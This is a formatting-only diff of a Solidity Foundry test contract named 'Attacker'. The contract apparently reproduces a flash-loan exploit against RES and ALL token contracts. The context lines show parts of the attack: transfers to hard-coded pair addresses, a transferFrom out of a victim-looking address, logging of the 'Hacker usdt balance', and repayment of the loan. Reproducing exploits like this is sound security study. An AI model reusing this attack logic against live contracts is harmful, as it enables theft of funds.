@@ -65,7 +65,7 @@ contract Attacker is Test {
                 "[FlashLoan]  Res Token Balance Of address(user):",
                 restoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229)),
                 8
-                );
+            );
 
             usdt.transfer(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A, 476_862_899_365_088_591_182_696);
 
@@ -122,7 +122,7 @@ contract Attacker is Test {
                 "[FlashLoan]  All Token Balance Of address(user):",
                 alltoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229)),
                 18
-                );
+            );
 
             uint256 alltoken_balance = alltoken.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229));
 
@@ -142,7 +142,7 @@ contract Attacker is Test {
 
             emit log_named_decimal_uint(
                 "[FlashLoan] sell Alltoken over, Hacker usdt balance is :", usdt.balanceOf(address(this)), 18
-                );
+            );
 
             restoken.transferFrom(
                 0x3F693Effc53908d517F186A20431f756C90c2229, 0x05ba2c512788bd95cd6D61D3109c53a14b01c82A, res_balance
@@ -152,7 +152,7 @@ contract Attacker is Test {
 
             emit log_named_decimal_uint(
                 "[FlashLoan] sell Restoken over, Hacker usdt balance is :", usdt.balanceOf(address(this)), 18
-                );
+            );
 
             uint256 refund = amount0 + ((amount0 * 251 / 100_000));
             usdt.transfer(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, refund);
